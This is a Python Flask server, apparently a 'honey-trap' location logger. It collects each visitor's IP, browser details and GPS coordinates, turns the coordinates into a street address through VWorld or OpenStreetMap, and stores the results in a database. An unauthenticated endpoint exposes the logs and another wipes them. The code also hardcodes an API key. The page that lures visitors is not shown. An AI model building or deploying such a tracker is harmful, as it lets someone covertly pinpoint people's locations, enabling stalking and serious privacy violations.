import sqlite3, os, requests
from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'security.db')
app = Flask(__name__)
VWORLD_KEY = "1B733389-A039-49D0-83F3-6ACD3F8082A2"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('''CREATE TABLE IF NOT EXISTS logs
                    (ip TEXT, ua TEXT, res TEXT, tz TEXT, lat REAL, lng REAL, city TEXT, score INTEGER, platform TEXT, timestamp TEXT)''')
    conn.commit(); conn.close()
init_db()

def get_detail_address(lng, lat):
    # 1) VWorld - 도로명 주소
    try:
        url = f"https://api.vworld.kr/req/address?service=address&request=getAddress&version=2.0&crs=epsg:4326&point={lng},{lat}&format=json&type=both&key={VWORLD_KEY}"
        r = requests.get(url, timeout=4).json()
        result = r.get('response',{}).get('result',[])
        if result and result[0].get('text'):
            return result[0].get('text')
    except: pass
    # 2) OSM 백업 - 키 필요없음
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18&accept-language=ko"
        j = requests.get(url, headers={"User-Agent":"honey-trap/1.0"}, timeout=5).json()
        addr = j.get('display_name','')
        if addr:
            return addr.replace('대한민국, ','')
    except: pass
    return f"{lat:.6f}, {lng:.6f}"

@app.route('/scan', methods=['POST'])
def scan():
    data=request.json or {}
    ip=request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    plat=data.get('plat','Mobile')
    lng,lat=data.get('lng'),data.get('lat')
    if lat and lng:
        lat=float(lat); lng=float(lng)
        city=get_detail_address(lng,lat)
    else:
        lat,lng=35.8242,127.1480
        city="IP 위치 (GPS 거부)"
    now=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    conn=sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO logs VALUES (?,?,?,?,?,?,?,?,?,?)",(ip,data.get('ua',''),data.get('res',''),'Asia/Seoul',lat,lng,city,0,plat,now))
    conn.commit(); conn.close()
    return jsonify({"status":"success","address":city})

@app.route('/api/logs')
def api_logs():
    conn=sqlite3.connect(DB_PATH); conn.row_factory=sqlite3.Row
    rows=conn.execute("SELECT * FROM logs ORDER BY rowid DESC LIMIT 500").fetchall(); conn.close()
    return jsonify([dict(r) for r in rows])

@app.route('/api/clear', methods=['POST'])
def api_clear():
    conn=sqlite3.connect(DB_PATH); conn.execute("DELETE FROM logs"); conn.commit(); conn.close()
    return jsonify({"status":"cleared"})

@app.route('/admin')
def admin(): return send_from_directory(BASE_DIR, 'dashboard.html')
@app.route('/')
def index(): return send_from_directory(BASE_DIR, 'index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT",8080)))